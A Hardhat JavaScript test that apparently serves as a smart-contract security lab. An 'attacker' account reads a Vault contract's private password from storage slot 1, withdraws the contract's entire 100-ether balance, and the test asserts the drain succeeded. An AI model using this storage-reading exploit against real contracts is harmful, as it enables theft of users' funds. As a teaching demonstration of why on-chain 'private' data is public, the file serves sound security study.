const {loadFixture,} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
  
  describe("Vault", function () {
    // We define a fixture to reuse the same setup in every test.
    // We use loadFixture to run this setup once, snapshot that state,
    // and reset Hardhat Network to that snapshot in every test.
    async function deployVaultContract() {  
  
      // Contracts are deployed using the first signer/account by default
      const [owner, attacker, user] = await ethers.getSigners();
      let myPassword = ethers.utils.formatBytes32String("myPassword")
  
      const Vault = await ethers.getContractFactory("Vault");
      const vault = await Vault.deploy(myPassword);
      // await vault.deployed();
      await vault.deposit({value:ethers.utils.parseEther("100")})
  
      return { owner, attacker, vault, user };
    }

    describe("Vault", () => {
        it("Should be possible to access its private variables", async function(){
            const { vault, attacker} = await loadFixture(deployVaultContract);

            let initialBalanceContract = await ethers.provider.getBalance(vault.address);
            let initialBalanceAttacker = await ethers.provider.getBalance(attacker.address);

            console.log("Contract's initial balance: ", ethers.utils.formatEther(initialBalanceContract.toString()));
            console.log("Attacker's initial balance: ", ethers.utils.formatEther(initialBalanceAttacker.toString()));


            let password = await ethers.provider.getStorageAt(vault.address, 1);

            console.log("====================================");
            console.log("= Password: " + password + "=");
            console.log("====================================")


            await vault.connect(attacker).withdraw(password);

            let finalBalanceContract = await ethers.provider.getBalance(vault.address);
            let finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);

            console.log("Contract's final balance: ", ethers.utils.formatEther(finalBalanceContract.toString()));
            console.log("Attacker's final balance: ", ethers.utils.formatEther(finalBalanceAttacker.toString()));

            expect(finalBalanceContract).to.eq(0);
            expect(finalBalanceAttacker).to.be.greaterThan(initialBalanceAttacker);

        });

    }

  );


})